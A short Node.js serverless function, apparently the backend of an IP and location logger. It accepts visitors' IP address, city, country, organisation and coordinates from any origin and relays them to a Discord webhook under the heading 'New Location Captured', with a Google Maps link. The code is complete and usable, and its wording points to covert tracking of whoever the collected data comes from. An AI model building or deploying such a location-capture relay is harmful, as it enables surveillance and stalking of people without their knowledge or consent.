module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { ip, city, region, country, org, lat, lon, timestamp } = req.body;

  const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

  if (!WEBHOOK_URL) {
    return res.status(500).json({ error: "Webhook URL not configured" });
  }

  const embed = {
    title: "📍 New Location Captured",
    color: 0x00ff00,
    fields: [
      { name: "IP", value: ip || "N/A", inline: true },
      { name: "City", value: city || "N/A", inline: true },
      { name: "Region", value: region || "N/A", inline: true },
      { name: "Country", value: country || "N/A", inline: true },
      { name: "Org", value: org || "N/A", inline: true },
      { name: "Lat", value: lat ? String(lat) : "N/A", inline: true },
      { name: "Lon", value: lon ? String(lon) : "N/A", inline: true },
      { name: "Time", value: timestamp || new Date().toISOString(), inline: false }
    ]
  };

  if (lat && lon) {
    embed.url = `https://www.google.com/maps?q=${lat},${lon}`;
  }

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: "Failed to send webhook" });
  }
};
